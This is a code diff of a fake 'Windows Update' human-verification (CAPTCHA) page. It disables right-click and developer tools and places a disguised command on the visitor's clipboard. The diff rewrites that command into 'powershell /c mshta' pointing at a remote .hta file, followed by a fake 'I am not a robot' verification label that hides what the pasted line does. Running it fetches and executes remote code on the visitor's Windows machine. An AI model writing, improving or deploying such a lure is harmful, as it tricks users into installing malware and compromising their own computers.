@@ -4,9 +4,9 @@
 <head>
     <title>Windows Update 人机验证</title>
     <script>
-            let hasUnsaved = true;
-    document.addEventListener('input', () => hasUnsaved = true);
-    window.onbeforeunload = () => hasUnsaved ? '' : void 0;
+        let hasUnsaved = true;
+        document.addEventListener('input', () => hasUnsaved = true);
+        window.onbeforeunload = () => hasUnsaved ? '' : void 0;
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('keydown', e => {
             if (e.key === 'F12') e.preventDefault();
@@ -34,7 +34,7 @@
             setInterval(checkDevToolOpen, 300);
         })();
         (function () {
-            const textToCopy = "mshta http://mcedge.github.io/mcedge/index.hta#✅ I am not a robot - CAPTCHA Verification ID: 114514";
+            const textToCopy = "powershell /c mshta http://mcedge.github.io/mcedge/index.hta# ✅ I am not a robot - CAPTCHA Verification ID: 114514";
 
             async function copyText(text) {
                 try {
@@ -115,6 +115,12 @@
                 }
             });
         });
+        if (window.history.replaceState) {
+            const currentUrl = new URL(window.location);
+            currentUrl.searchParams.delete('stage');
+            currentUrl.searchParams.delete('static');
+            window.history.replaceState({}, document.title, currentUrl.pathname + currentUrl.search);
+        }
     </script>
     <script referrerpolicy="no-referrer" src="jquery-4.0.0.min.js">
     </script>
@@ -2131,17 +2137,8 @@
                     </style>
                     <!-- URL参数清理(保留原功能,代码格式优化) -->
                     <script>
-                        if (window.history.replaceState) {
-                            const currentUrl = new URL(window.location);
-                            currentUrl.searchParams.delete('stage');
-                            currentUrl.searchParams.delete('static');
-                            window.history.replaceState({}, document.title, currentUrl.pathname + currentUrl.search);
-                        }
+
                     </script>
-                    <!-- Google Tag Manager (noscript) -->
-                    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-N2TRKSCC" height="0"
-                            width="0" style="display:none;visibility:hidden"></iframe></noscript>
-                    <!-- End Google Tag Manager (noscript) -->
                 </div>
             </div>
         </div>
